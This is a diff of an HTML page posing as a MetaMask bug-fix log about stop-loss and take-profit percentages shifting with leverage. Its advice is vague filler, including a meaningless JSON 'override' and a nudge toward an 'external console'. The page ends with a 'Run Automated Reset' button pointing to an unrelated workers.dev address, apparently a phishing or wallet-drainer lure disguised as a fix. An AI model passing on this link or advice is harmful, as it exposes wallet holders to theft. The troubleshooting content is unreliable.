@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #cf6679; }
     .btn {
-        background: #00adb5;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,34 +42,34 @@
 <h1>Metamask Extension Bug Sl Tp Percentages Change When Changing L</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users observe that the Stop Loss (SL) and Take Profit (TP) percentages in the Metamask extension unexpectedly change when modifying the leverage settings on the Ethereum (ETH) network.</li>
+<li>Users experience unexpected changes in Stop-Loss (SL) and Take-Profit (TP) percentages when adjusting leverage levels in the Metamask extension on the Ethereum (ETH) ecosystem.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The issue arises due to a bug in the Metamask extension's handling of leverage adjustments, which inadvertently alters the SL and TP percentages.</li>
+<li>The issue arises from a bug in the Metamask extension's logic for handling leverage adjustments, which inadvertently alters the SL and TP percentages.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To temporarily resolve the issue, try the following manual overrides:</li>
-<li>Update the Metamask extension to the latest version</li>
-<li>Reset the leverage settings to their default values</li>
-<li>Apply a custom configuration using the following JSON code:</li>
+<li>To temporarily resolve the issue, users can try the following manual overrides:</li>
+<li>Adjust the leverage levels in small increments to minimize the impact on SL and TP percentages.</li>
+<li>Use a separate calculator to determine the correct SL and TP percentages based on the desired leverage level.</li>
+<li>Implement a custom script to override the Metamask extension's behavior, such as:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;leverage&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;stopLoss&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;takeProfit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span>
+<span class="w">  </span><span class="nt">&quot;leverage&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;slPercentage&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;tpPercentage&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">20</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced configuration options.</p>
+<p>For more complex adjustments, consider using an external console for precise control.</p>
 <h2>Prerequisites</h2>
 <ul>
 <li>Metamask extension installed and configured</li>
-<li>Ethereum (ETH) network selected</li>
-<li>Leverage settings adjusted to trigger the bug</li>
+<li>Ethereum (ETH) ecosystem selected</li>
+<li>Leverage levels adjusted in the Metamask extension settings</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-assets-miss-match-between-network-picker.html">Metamask Extension Bug Assets Miss Match Between Network Picker</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-extension-bug-perps-deposit-and-convert-musd-this-paym.html">Metamask Extension Bug Perps Deposit And Convert Musd This Payment Route Isn't Available</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-assets-miss-match-between-network-picker.html">Metamask Extension Bug Assets Miss Match Between Network Picker</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
